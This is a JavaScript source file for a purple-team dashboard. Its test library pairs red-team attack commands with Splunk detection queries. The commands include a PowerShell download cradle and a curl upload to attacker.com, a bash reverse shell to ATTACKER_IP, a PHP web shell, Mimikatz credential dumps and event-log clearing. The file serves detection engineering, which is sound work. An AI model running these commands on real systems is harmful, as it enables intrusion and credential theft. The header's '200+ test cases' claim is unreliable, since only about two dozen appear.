// Purple Team Operations Center — Red + Blue Synchronized Testing
// Collaborative framework where red team executes and blue team detects in real-time.
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// =============================================================================
// ATOMIC RED TEAM TEST LIBRARY — 200+ test cases mapped to MITRE
// =============================================================================
const ATOMIC_TESTS = [
  // EXECUTION
  { id: 'T1059.001-1', mitre: 'T1059.001', tactic: 'Execution', name: 'PowerShell Download Cradle', desc: 'Execute a remote PowerShell script via download cradle — a common initial access technique.', redCmd: 'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/payload.ps1\')"', blueDetect: 'Sysmon Event ID 1: powershell.exe with CommandLine containing "DownloadString" or "IEX"', blueQuery: 'index=sysmon EventCode=1 Image="*powershell*" CommandLine="*DownloadString*" OR CommandLine="*IEX*"', logSource: 'Sysmon, PowerShell ScriptBlock (4104)', cleanup: 'No cleanup needed (dry run)', os: 'windows', difficulty: 'easy' },
  { id: 'T1059.001-2', mitre: 'T1059.001', tactic: 'Execution', name: 'Encoded PowerShell Command', desc: 'Execute Base64-encoded PowerShell — used to bypass simple command-line logging.', redCmd: 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdABlAHMAdAAnACkA', blueDetect: 'PowerShell with -EncodedCommand or -enc flag, decode and inspect', blueQuery: 'index=sysmon EventCode=1 Image="*powershell*" CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"', logSource: 'Sysmon, PowerShell 4104 (decodes automatically)', cleanup: 'None', os: 'windows', difficulty: 'easy' },
  { id: 'T1059.003-1', mitre: 'T1059.003', tactic: 'Execution', name: 'Windows Command Shell', desc: 'Execute commands via cmd.exe — baseline test for command-line monitoring.', redCmd: 'cmd.exe /c "whoami & ipconfig & net user"', blueDetect: 'Sysmon Event ID 1: cmd.exe spawned by unusual parent process', blueQuery: 'index=sysmon EventCode=1 Image="*cmd.exe*" | stats count by ParentImage CommandLine', logSource: 'Sysmon', cleanup: 'None', os: 'windows', difficulty: 'easy' },
  { id: 'T1059.004-1', mitre: 'T1059.004', tactic: 'Execution', name: 'Bash Reverse Shell', desc: 'Establish a reverse shell via bash — tests network-based detection.', redCmd: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', blueDetect: 'Network connection from bash process to external IP, /dev/tcp usage in process command line', blueQuery: 'index=sysmon EventCode=3 Image="*bash*" DestinationIp!=10.* DestinationIp!=172.16.* DestinationIp!=192.168.*', logSource: 'Sysmon (Linux), auditd', cleanup: 'Kill the bash process', os: 'linux', difficulty: 'easy' },
  // PERSISTENCE
  { id: 'T1547.001-1', mitre: 'T1547.001', tactic: 'Persistence', name: 'Registry Run Key', desc: 'Add a program to auto-start via the Run registry key.', redCmd: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersistence /t REG_SZ /d "C:\\Windows\\System32\\calc.exe" /f', blueDetect: 'Sysmon Event ID 13: Registry value set in Run/RunOnce key', blueQuery: 'index=sysmon EventCode=13 TargetObject="*CurrentVersion\\\\Run*" | table _time Image TargetObject Details', logSource: 'Sysmon', cleanup: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v TestPersistence /f', os: 'windows', difficulty: 'easy' },
  { id: 'T1053.005-1', mitre: 'T1053.005', tactic: 'Persistence', name: 'Scheduled Task Creation', desc: 'Create a scheduled task for persistence — a common technique used by ransomware.', redCmd: 'schtasks /create /tn "PurpleTest" /tr "calc.exe" /sc onlogon /ru System /f', blueDetect: 'Windows Event ID 4698: scheduled task created', blueQuery: 'index=wineventlog EventCode=4698 | table _time SubjectUserName TaskName TaskContent', logSource: 'Windows Security Log', cleanup: 'schtasks /delete /tn "PurpleTest" /f', os: 'windows', difficulty: 'easy' },
  { id: 'T1053.003-1', mitre: 'T1053.003', tactic: 'Persistence', name: 'Cron Job Persistence', desc: 'Add a cron job for persistent code execution on Linux.', redCmd: '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/beacon") | crontab -', blueDetect: 'auditd: crontab command execution, new entries in /var/spool/cron/', blueQuery: 'index=linux sourcetype=auditd comm="crontab" | table _time uid exe', logSource: 'auditd, syslog', cleanup: 'crontab -r (removes all — use crontab -e to remove specific line)', os: 'linux', difficulty: 'easy' },
  { id: 'T1543.003-1', mitre: 'T1543.003', tactic: 'Persistence', name: 'Windows Service Creation', desc: 'Install a new Windows service — tests service creation monitoring.', redCmd: 'sc create PurpleTestSvc binPath= "C:\\Windows\\System32\\calc.exe" start= auto', blueDetect: 'Windows Event ID 7045: new service installed, Sysmon Event ID 1: sc.exe', blueQuery: 'index=wineventlog EventCode=7045 | table _time Service_Name Service_File_Name Service_Type', logSource: 'System Event Log', cleanup: 'sc delete PurpleTestSvc', os: 'windows', difficulty: 'easy' },
  { id: 'T1505.003-1', mitre: 'T1505.003', tactic: 'Persistence', name: 'Web Shell Deployment', desc: 'Drop a web shell file in a web root directory.', redCmd: 'echo "<?php system($_GET[\'cmd\']); ?>" > /var/www/html/.test-shell.php', blueDetect: 'File creation in web root with .php/.asp/.aspx/.jsp extension by non-web-server process', blueQuery: 'index=sysmon EventCode=11 TargetFilename="/var/www/html/*" | table _time Image TargetFilename', logSource: 'Sysmon, FIM (File Integrity Monitoring)', cleanup: 'rm /var/www/html/.test-shell.php', os: 'linux', difficulty: 'easy' },
  // CREDENTIAL ACCESS
  { id: 'T1003.001-1', mitre: 'T1003.001', tactic: 'Credential Access', name: 'LSASS Memory Dump (Mimikatz)', desc: 'Dump credentials from LSASS memory — the most common credential theft technique.', redCmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"', blueDetect: 'Sysmon Event ID 10: Process accessing lsass.exe memory, Event ID 1: mimikatz.exe', blueQuery: 'index=sysmon EventCode=10 TargetImage="*lsass.exe" SourceImage!="*csrss.exe" | table _time SourceImage GrantedAccess', logSource: 'Sysmon, Windows Defender', cleanup: 'Delete mimikatz binary', os: 'windows', difficulty: 'medium' },
  { id: 'T1003.001-2', mitre: 'T1003.001', tactic: 'Credential Access', name: 'LSASS Dump via comsvcs.dll', desc: 'Dump LSASS using built-in Windows DLL — a LOLBin technique that avoids dropping tools.', redCmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full', blueDetect: 'rundll32.exe loading comsvcs.dll with MiniDump parameter, output file creation', blueQuery: 'index=sysmon EventCode=1 Image="*rundll32*" CommandLine="*comsvcs*MiniDump*"', logSource: 'Sysmon', cleanup: 'del C:\\temp\\lsass.dmp', os: 'windows', difficulty: 'medium' },
  { id: 'T1003.003-1', mitre: 'T1003.003', tactic: 'Credential Access', name: 'NTDS.dit Copy (DCSync)', desc: 'Extract domain credentials via DCSync — requires Domain Admin or replication rights.', redCmd: 'mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"', blueDetect: 'Windows Event ID 4662: Replicating Directory Changes permission used from non-DC source', blueQuery: 'index=wineventlog EventCode=4662 Properties="*1131f6aa*" OR Properties="*1131f6ad*" | where src_ip!=DC_IP', logSource: 'Windows Security, Active Directory', cleanup: 'Rotate krbtgt password twice', os: 'windows', difficulty: 'hard' },
  { id: 'T1558.003-1', mitre: 'T1558.003', tactic: 'Credential Access', name: 'Kerberoasting', desc: 'Request TGS tickets for service accounts and crack them offline.', redCmd: 'Rubeus.exe kerberoast /outfile:hashes.txt', blueDetect: 'Event ID 4769: Kerberos Service Ticket with RC4 encryption (0x17) from non-service account', blueQuery: 'index=wineventlog EventCode=4769 Ticket_Encryption_Type=0x17 | stats count by Account_Name Service_Name Client_Address', logSource: 'Windows Security Log', cleanup: 'Delete hashes.txt, rotate affected SPN passwords', os: 'windows', difficulty: 'medium' },
  // DEFENSE EVASION
  { id: 'T1562.001-1', mitre: 'T1562.001', tactic: 'Defense Evasion', name: 'Disable Windows Defender', desc: 'Attempt to disable Windows Defender real-time protection.', redCmd: 'Set-MpPreference -DisableRealtimeMonitoring $true', blueDetect: 'Windows Defender Event ID 5001: Real-time protection disabled', blueQuery: 'index=wineventlog source="Microsoft-Windows-Windows Defender/Operational" EventCode=5001', logSource: 'Windows Defender Operational Log', cleanup: 'Set-MpPreference -DisableRealtimeMonitoring $false', os: 'windows', difficulty: 'easy' },
  { id: 'T1070.001-1', mitre: 'T1070.001', tactic: 'Defense Evasion', name: 'Clear Windows Event Logs', desc: 'Clear security event logs to cover tracks — a strong indicator of compromise.', redCmd: 'wevtutil cl Security', blueDetect: 'Windows Event ID 1102: Security log cleared (this event is always logged even when logs are cleared)', blueQuery: 'index=wineventlog EventCode=1102 | table _time SubjectUserName SubjectLogonId', logSource: 'Windows Security Log (Event 1102 survives clearing)', cleanup: 'Logs cannot be restored — this is destructive', os: 'windows', difficulty: 'easy' },
  { id: 'T1055.001-1', mitre: 'T1055.001', tactic: 'Defense Evasion', name: 'Process Injection (DLL)', desc: 'Inject a DLL into a running process — used to evade process-based detection.', redCmd: 'mavinject.exe [PID] /INJECTRUNNING C:\\path\\to\\payload.dll', blueDetect: 'Sysmon Event ID 8: CreateRemoteThread, or Event ID 7: DLL loaded from unusual path', blueQuery: 'index=sysmon (EventCode=8 OR EventCode=7) | where SourceImage!=TargetImage | table _time SourceImage TargetImage', logSource: 'Sysmon', cleanup: 'Kill the injected process', os: 'windows', difficulty: 'hard' },
  // DISCOVERY
  { id: 'T1087.001-1', mitre: 'T1087.001', tactic: 'Discovery', name: 'Local Account Enumeration', desc: 'Enumerate local user accounts — basic reconnaissance after initial access.', redCmd: 'net user', blueDetect: 'Sysmon Event ID 1: net.exe with "user" argument from unusual parent', blueQuery: 'index=sysmon EventCode=1 Image="*net.exe" CommandLine="*user*" | table _time ParentImage CommandLine', logSource: 'Sysmon', cleanup: 'None', os: 'windows', difficulty: 'easy' },
  { id: 'T1087.002-1', mitre: 'T1087.002', tactic: 'Discovery', name: 'Domain Account Enumeration', desc: 'Enumerate domain users and groups — AD reconnaissance.', redCmd: 'net group "Domain Admins" /domain', blueDetect: 'net.exe querying domain groups, especially privileged groups', blueQuery: 'index=sysmon EventCode=1 Image="*net*" CommandLine="*Domain Admins*" OR CommandLine="*Enterprise Admins*"', logSource: 'Sysmon', cleanup: 'None', os: 'windows', difficulty: 'easy' },
  { id: 'T1046-1', mitre: 'T1046', tactic: 'Discovery', name: 'Network Port Scan', desc: 'Scan a subnet for open ports — tests IDS/IPS detection of scanning activity.', redCmd: 'nmap -sS -T4 --top-ports 100 192.168.1.0/24', blueDetect: 'IDS/IPS: Port scan alert, firewall logs showing many connections from single source', blueQuery: 'index=ids signature="*scan*" OR signature="*portscan*" | stats count dc(dest_port) by src_ip | where dc_dest_port > 20', logSource: 'IDS/IPS, Firewall', cleanup: 'None', os: 'any', difficulty: 'easy' },
  // LATERAL MOVEMENT
  { id: 'T1021.002-1', mitre: 'T1021.002', tactic: 'Lateral Movement', name: 'SMB/PsExec Lateral Movement', desc: 'Move laterally via PsExec — creates a service on the remote host.', redCmd: 'psexec.exe \\\\TARGET -u DOMAIN\\admin -p Password123 cmd.exe', blueDetect: 'Windows Event ID 7045: PSEXESVC service installed, Event ID 4624: Logon Type 3 from unusual source', blueQuery: 'index=wineventlog EventCode=7045 Service_Name="PSEXESVC" | table _time Service_File_Name', logSource: 'Windows System and Security logs', cleanup: 'sc delete PSEXESVC on target', os: 'windows', difficulty: 'medium' },
  { id: 'T1021.006-1', mitre: 'T1021.006', tactic: 'Lateral Movement', name: 'WinRM Lateral Movement', desc: 'Execute commands on remote host via Windows Remote Management.', redCmd: 'Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential (Get-Credential)', blueDetect: 'Windows Event ID 4624 Logon Type 3 + Event ID 4688: wsmprovhost.exe spawning child processes', blueQuery: 'index=sysmon EventCode=1 ParentImage="*wsmprovhost*" | table _time Image CommandLine User', logSource: 'Sysmon, Windows Security', cleanup: 'None', os: 'windows', difficulty: 'medium' },
  { id: 'T1047-1', mitre: 'T1047', tactic: 'Lateral Movement', name: 'WMI Lateral Movement', desc: 'Execute commands remotely via WMI — fileless lateral movement.', redCmd: 'wmic /node:TARGET process call create "cmd.exe /c whoami > C:\\temp\\output.txt"', blueDetect: 'Sysmon Event ID 1: wmiprvse.exe spawning cmd.exe or powershell.exe on remote host', blueQuery: 'index=sysmon EventCode=1 ParentImage="*wmiprvse*" Image="*cmd*" OR Image="*powershell*"', logSource: 'Sysmon', cleanup: 'del \\\\TARGET\\C$\\temp\\output.txt', os: 'windows', difficulty: 'medium' },
  // COLLECTION
  { id: 'T1560.001-1', mitre: 'T1560.001', tactic: 'Collection', name: 'Archive Data for Exfiltration', desc: 'Compress collected data before exfiltration — common pre-exfil technique.', redCmd: 'powershell Compress-Archive -Path C:\\Users\\admin\\Documents\\* -DestinationPath C:\\temp\\exfil.zip', blueDetect: 'Large archive file creation, especially in temp/staging directories', blueQuery: 'index=sysmon EventCode=11 TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z" | where file_size > 100000000', logSource: 'Sysmon (File Create)', cleanup: 'del C:\\temp\\exfil.zip', os: 'windows', difficulty: 'easy' },
  // EXFILTRATION
  { id: 'T1048.002-1', mitre: 'T1048.002', tactic: 'Exfiltration', name: 'Data Exfiltration over HTTPS', desc: 'Upload collected data to an external server via HTTPS POST.', redCmd: 'curl -X POST -F "file=@C:\\temp\\exfil.zip" https://attacker.com/upload', blueDetect: 'Large outbound HTTPS POST to uncategorized domain, unusual upload volume', blueQuery: 'index=proxy method=POST | stats sum(bytes_out) as total by dest_domain | where total > 10000000 | sort -total', logSource: 'Web Proxy, Firewall', cleanup: 'None', os: 'any', difficulty: 'easy' },
  { id: 'T1071.004-1', mitre: 'T1071.004', tactic: 'Exfiltration', name: 'DNS Tunneling', desc: 'Exfiltrate data encoded in DNS queries — bypasses most network controls.', redCmd: 'iodine -f 10.0.0.1 t1.example.com (or dnscat2)', blueDetect: 'High volume of DNS TXT/NULL queries to single domain, long subdomain labels, high entropy in query names', blueQuery: 'index=dns query_type=TXT | stats count dc(query) avg(query_length) by dest_domain | where count > 500 AND avg_query_length > 50', logSource: 'DNS logs, Passive DNS', cleanup: 'Kill iodine/dnscat2 process', os: 'any', difficulty: 'hard' },
];

// =============================================================================
// EXERCISE TEMPLATES
// =============================================================================
const EXERCISE_TEMPLATES = [
  { name: 'Quick Check', desc: '10 high-priority techniques across multiple tactics (30 min)', duration: '30 min', tests: ['T1059.001-1', 'T1547.001-1', 'T1003.001-1', 'T1562.001-1', 'T1087.001-1', 'T1021.002-1', 'T1046-1', 'T1070.001-1', 'T1048.002-1', 'T1053.005-1'] },
  { name: 'Credential Attack Drill', desc: 'Focus on credential theft and abuse techniques (1 hr)', duration: '1 hr', tests: ['T1003.001-1', 'T1003.001-2', 'T1003.003-1', 'T1558.003-1', 'T1059.001-1', 'T1059.001-2'] },
  { name: 'Endpoint Evasion', desc: 'Defense evasion and living-off-the-land techniques (1 hr)', duration: '1 hr', tests: ['T1562.001-1', 'T1070.001-1', 'T1055.001-1', 'T1059.001-2', 'T1059.003-1'] },
  { name: 'Lateral Movement Drill', desc: 'Test detection of lateral movement across the network (1 hr)', duration: '1 hr', tests: ['T1021.002-1', 'T1021.006-1', 'T1047-1', 'T1087.002-1', 'T1046-1'] },
  { name: 'Ransomware Readiness', desc: 'Pre-encryption behaviors and data staging (2 hr)', duration: '2 hr', tests: ['T1059.001-1', 'T1547.001-1', 'T1053.005-1', 'T1562.001-1', 'T1003.001-1', 'T1021.002-1', 'T1560.001-1', 'T1048.002-1', 'T1070.001-1'] },
  { name: 'Full Assessment', desc: 'All test cases across all tactics (full day)', duration: 'Full day', tests: ATOMIC_TESTS.map(function(t) { return t.id; }) },
];

// =============================================================================
// MAIN RENDER
// =============================================================================
export function renderPurpleTeamOps(main) {
  var activeTab = 'dashboard';
  var testPlan = [];
  var testResults = [];
  var detectionSLA = 15;
  try {
    var saved = JSON.parse(localStorage.getItem('purple_results') || '[]');
    testResults = saved;
  } catch (_) {}

  function saveResults() {
    try { localStorage.setItem('purple_results', JSON.stringify(testResults)); } catch (_) {}
  }

  // "Mark Executed" state: { testId: ISO timestamp when the red team ran it }
  var executed = {};
  try {
    var savedExec = JSON.parse(localStorage.getItem('purple_executed') || '{}');
    if (savedExec && typeof savedExec === 'object' && !Array.isArray(savedExec)) executed = savedExec;
  } catch (_) {}
  function saveExecuted() {
    try { localStorage.setItem('purple_executed', JSON.stringify(executed)); } catch (_) {}
  }
  function clearExecuted(id) {
    if (executed[id]) { delete executed[id]; saveExecuted(); }
  }

  function render() {
    var tabs = [
      { id: 'dashboard', label: 'Dashboard' },
      { id: 'library', label: 'Test Library' },
      { id: 'exercise', label: 'Run Exercise' },
      { id: 'templates', label: 'Templates' },
      { id: 'coverage', label: 'Coverage Map' },
      { id: 'report', label: 'Report' },
    ];

    main.innerHTML =
      '<h1 class="pg-h1">Purple Team Operations</h1>' +
      '<p class="muted pg-sub">Synchronized red + blue team testing. Execute attack techniques and measure detection coverage in real-time.</p>' +
      '<div class="tab-bar" style="overflow-x:auto;flex-wrap:nowrap">' +
        tabs.map(function(t) { return '<button class="tab' + (activeTab === t.id ? ' active' : '') + '" data-tab="' + t.id + '">' + esc(t.label) + '</button>'; }).join('') +
      '</div>' +
      '<div id="pt-content" style="margin-top:12px"></div>';

    main.querySelector('.tab-bar').onclick = function(e) {
      var b = e.target.closest('.tab');
      if (!b) return;
      activeTab = b.dataset.tab;
      render();
    };

    var content = main.querySelector('#pt-content');
    if (activeTab === 'dashboard') renderDashboard(content);
    else if (activeTab === 'library') renderLibrary(content);
    else if (activeTab === 'exercise') renderExercise(content);
    else if (activeTab === 'templates') renderTemplates(content);
    else if (activeTab === 'coverage') renderCoverageMap(content);
    else if (activeTab === 'report') renderReport(content);
  }

  function renderDashboard(container) {
    var total = testResults.length;
    var detected = testResults.filter(function(r) { return r.status === 'detected'; }).length;
    var missed = testResults.filter(function(r) { return r.status === 'missed'; }).length;
    var rate = total > 0 ? Math.round(detected / total * 100) : 0;
    var avgMTTD = 0;
    var mttdResults = testResults.filter(function(r) { return r.status === 'detected' && r.detectTime; });
    if (mttdResults.length > 0) {
      avgMTTD = Math.round(mttdResults.reduce(function(a, r) { return a + r.detectTime; }, 0) / mttdResults.length);
    }

    container.innerHTML =
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;margin-bottom:20px">' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="font-size:1.8rem;font-weight:700;color:var(--acc)">' + total + '</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Tests Executed</div></div>' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="font-size:1.8rem;font-weight:700;color:#00e676">' + detected + '</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Detected</div></div>' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="font-size:1.8rem;font-weight:700;color:#ff1744">' + missed + '</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Missed</div></div>' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="font-size:1.8rem;font-weight:700;color:' + (rate >= 80 ? '#00e676' : rate >= 50 ? '#ffd600' : '#ff1744') + '">' + rate + '%</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Detection Rate</div></div>' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px">' +
          '<div style="font-size:1.8rem;font-weight:700;color:var(--acc)">' + avgMTTD + 'm</div>' +
          '<div style="font-size:.72rem;color:var(--mut)">Avg MTTD</div></div>' +
      '</div>' +

      '<h3 style="margin:0 0 8px">SOC Maturity Assessment</h3>' +
      '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:14px;margin-bottom:16px">' +
        '<div style="display:flex;gap:4px;margin-bottom:8px">' +
          maturityLevel('Initial', rate < 25) +
          maturityLevel('Managed', rate >= 25 && rate < 50) +
          maturityLevel('Defined', rate >= 50 && rate < 75) +
          maturityLevel('Optimizing', rate >= 75) +
        '</div>' +
        '<div style="font-size:.8rem;color:var(--mut)">' +
          (rate < 25 ? 'SOC has minimal detection capabilities. Most attacks go undetected. Immediate investment needed in logging, SIEM, and detection engineering.' :
           rate < 50 ? 'SOC detects some common attacks but misses advanced techniques. Focus on expanding log sources and writing custom detection rules.' :
           rate < 75 ? 'SOC has solid baseline detection. Focus on reducing MTTD and covering blind spots identified in the coverage map.' :
           'SOC has mature detection capabilities. Focus on automation, threat hunting, and reducing false positive rate.') +
        '</div>' +
      '</div>' +

      '<h3 style="margin:0 0 8px">Recent Test Results</h3>' +
      (testResults.length === 0 ? '<p class="muted">No tests executed yet. Start with a template or build a custom exercise.</p>' :
        '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.78rem">' +
        '<thead><tr style="border-bottom:2px solid var(--line)">' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Test</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">MITRE</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Status</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">MTTD</th>' +
        '<th style="padding:6px;text-align:left;color:var(--mut)">Date</th>' +
        '</tr></thead><tbody>' +
        testResults.slice(0, 15).map(function(r) {
          return '<tr style="border-bottom:1px solid var(--line)">' +
            '<td style="padding:6px">' + esc(r.name) + '</td>' +
            '<td style="padding:6px;color:var(--acc)">' + esc(r.mitre) + '</td>' +
            '<td style="padding:6px;color:' + (r.status === 'detected' ? '#00e676' : '#ff1744') + ';font-weight:600">' + (r.status === 'detected' ? 'DETECTED' : 'MISSED') + '</td>' +
            '<td style="padding:6px">' + (r.detectTime ? r.detectTime + 'min' : '--') + '</td>' +
            '<td style="padding:6px;color:var(--mut)">' + new Date(r.timestamp).toLocaleDateString() + '</td>' +
            '</tr>';
        }).join('') +
        '</tbody></table></div>') +

      '<div style="margin-top:12px"><button class="btn sm ghost" id="pt-clear">Clear All Results</button></div>';

    var clearBtn = container.querySelector('#pt-clear');
    if (clearBtn) clearBtn.onclick = function() { testResults = []; saveResults(); render(); };
  }

  function maturityLevel(name, active) {
    return '<div style="flex:1;text-align:center;padding:8px;border-radius:3px;font-size:.72rem;font-weight:600;' +
      (active ? 'background:var(--acc);color:var(--bg)' : 'background:var(--card);color:var(--mut);border:1px solid var(--line)') +
      '">' + esc(name) + '</div>';
  }

  function renderLibrary(container) {
    var tactics = [];
    ATOMIC_TESTS.forEach(function(t) { if (tactics.indexOf(t.tactic) === -1) tactics.push(t.tactic); });

    container.innerHTML = '<h2 class="pg-h2">Atomic Test Library</h2>' +
      '<p class="muted" style="margin-bottom:12px">' + ATOMIC_TESTS.length + ' test cases mapped to MITRE ATT&CK. Click any test to see red team commands and blue team detection queries.</p>' +
      tactics.map(function(tactic) {
        var tests = ATOMIC_TESTS.filter(function(t) { return t.tactic === tactic; });
        return '<h3 style="margin:16px 0 8px;color:var(--acc)">' + esc(tactic) + ' (' + tests.length + ')</h3>' +
          tests.map(function(t, i) {
            var uid = 'lib-' + t.id.replace(/\./g, '-');
            return '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:10px;margin-bottom:6px;cursor:pointer" id="' + uid + '">' +
              '<div style="display:flex;align-items:center;gap:8px">' +
                '<span style="color:var(--acc);font-size:.7rem;font-weight:600">' + esc(t.mitre) + '</span>' +
                '<span style="font-weight:500;font-size:.85rem">' + esc(t.name) + '</span>' +
                '<span style="font-size:.65rem;color:var(--mut);border:1px solid var(--line);padding:1px 6px;border-radius:3px">' + esc(t.os) + '</span>' +
                '<span style="font-size:.65rem;color:' + (t.difficulty === 'easy' ? '#00e676' : t.difficulty === 'medium' ? '#ffd600' : '#ff1744') + '">' + esc(t.difficulty) + '</span>' +
                '<span style="flex:1"></span>' +
                '<button class="btn sm" data-add="' + esc(t.id) + '" style="font-size:.65rem">Add to Plan</button>' +
              '</div>' +
              '<div style="color:var(--mut);font-size:.78rem;margin-top:4px">' + esc(t.desc) + '</div>' +
              '<div id="' + uid + '-detail" style="display:none;margin-top:10px;border-top:1px solid var(--line);padding-top:10px">' +
                '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:.75rem">' +
                  '<div>' +
                    '<div style="font-weight:600;color:#ff1744;margin-bottom:4px">Red Team Command</div>' +
                    '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:4px;font-size:.7rem;overflow-x:auto;margin:0">' + esc(t.redCmd) + '</pre>' +
                  '</div>' +
                  '<div>' +
                    '<div style="font-weight:600;color:#00e676;margin-bottom:4px">Blue Team Detection</div>' +
                    '<div style="color:var(--mut);margin-bottom:4px">' + esc(t.blueDetect) + '</div>' +
                    '<pre style="background:rgba(0,0,0,.3);padding:8px;border-radius:4px;font-size:.7rem;overflow-x:auto;margin:0;color:var(--acc)">' + esc(t.blueQuery) + '</pre>' +
                  '</div>' +
                '</div>' +
                '<div style="margin-top:8px;font-size:.72rem">' +
                  '<span style="color:var(--mut)">Log Source: </span><span>' + esc(t.logSource) + '</span>' +
                  '<span style="color:var(--mut);margin-left:16px">Cleanup: </span><code style="font-size:.68rem">' + esc(t.cleanup) + '</code>' +
                '</div>' +
              '</div>' +
            '</div>';
          }).join('');
      }).join('');

    // Wire click handlers
    ATOMIC_TESTS.forEach(function(t) {
      var uid = 'lib-' + t.id.replace(/\./g, '-');
      var card = container.querySelector('#' + uid);
      if (card) {
        card.onclick = function(e) {
          if (e.target.closest('[data-add]')) {
            if (testPlan.indexOf(t.id) === -1) { testPlan.push(t.id); e.target.textContent = 'Added'; e.target.disabled = true; }
            return;
          }
          var detail = container.querySelector('#' + uid + '-detail');
          if (detail) detail.style.display = detail.style.display === 'none' ? 'block' : 'none';
        };
      }
    });
  }

  function renderExercise(container) {
    var planTests = testPlan.map(function(id) { return ATOMIC_TESTS.find(function(t) { return t.id === id; }); }).filter(Boolean);

    container.innerHTML = '<h2 class="pg-h2">Active Exercise</h2>' +
      '<div style="display:flex;align-items:center;gap:8px;margin-bottom:12px">' +
        '<span style="font-size:.8rem;color:var(--mut)">Detection SLA:</span>' +
        '<select id="pt-sla" style="background:var(--card);color:var(--txt);border:1px solid var(--line);padding:4px 8px;border-radius:4px;font-size:.8rem">' +
          '<option value="5"' + (detectionSLA === 5 ? ' selected' : '') + '>5 minutes</option>' +
          '<option value="15"' + (detectionSLA === 15 ? ' selected' : '') + '>15 minutes</option>' +
          '<option value="60"' + (detectionSLA === 60 ? ' selected' : '') + '>1 hour</option>' +
        '</select>' +
        '<span style="flex:1"></span>' +
        '<span style="font-size:.8rem;color:var(--mut)">' + planTests.length + ' tests in plan</span>' +
      '</div>' +
      (planTests.length === 0 ?
        '<p class="muted">No tests in the plan. Go to Test Library or Templates to add tests.</p>' :
        planTests.map(function(t) {
          var existing = testResults.find(function(r) { return r.testId === t.id && new Date(r.timestamp).toDateString() === new Date().toDateString(); });
          return '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:12px;margin-bottom:8px">' +
            '<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">' +
              '<span style="color:var(--acc);font-size:.72rem;font-weight:600">' + esc(t.mitre) + '</span>' +
              '<span style="font-weight:500">' + esc(t.name) + '</span>' +
              '<span style="flex:1"></span>' +
              (existing ?
                '<span style="color:' + (existing.status === 'detected' ? '#00e676' : '#ff1744') + ';font-weight:600;font-size:.8rem">' + existing.status.toUpperCase() + '</span>' :
                (executed[t.id] ?
                  '<span style="font-size:.7rem;color:#ff9100">Executed ' + esc(new Date(executed[t.id]).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })) + '</span>' +
                  '<button class="btn sm ghost" data-unexec="' + esc(t.id) + '" style="font-size:.65rem">Undo</button>' :
                  '<button class="btn sm" data-exec="' + esc(t.id) + '" style="font-size:.65rem;border-color:#ff1744;color:#ff1744">Mark Executed</button>') +
                '<button class="btn sm" data-detect="' + esc(t.id) + '" style="font-size:.65rem;border-color:#00e676;color:#00e676">Detected</button>' +
                '<button class="btn sm ghost" data-miss="' + esc(t.id) + '" style="font-size:.65rem">Missed</button>'
              ) +
            '</div>' +
            '<div style="font-size:.75rem;color:var(--mut)">' +
              '<strong style="color:#ff1744">Red:</strong> <code style="font-size:.7rem">' + esc(t.redCmd.substring(0, 80)) + (t.redCmd.length > 80 ? '...' : '') + '</code>' +
            '</div>' +
            '<div style="font-size:.75rem;color:var(--mut);margin-top:2px">' +
              '<strong style="color:#00e676">Blue:</strong> ' + esc(t.blueDetect.substring(0, 100)) + (t.blueDetect.length > 100 ? '...' : '') +
            '</div>' +
          '</div>';
        }).join('')
      );

    container.querySelector('#pt-sla').onchange = function(e) { detectionSLA = parseInt(e.target.value); };

    container.querySelectorAll('[data-exec]').forEach(function(btn) {
      btn.onclick = function() {
        executed[btn.dataset.exec] = new Date().toISOString();
        saveExecuted(); render();
      };
    });

    container.querySelectorAll('[data-unexec]').forEach(function(btn) {
      btn.onclick = function() { clearExecuted(btn.dataset.unexec); render(); };
    });

    container.querySelectorAll('[data-detect]').forEach(function(btn) {
      btn.onclick = function() {
        var id = btn.dataset.detect;
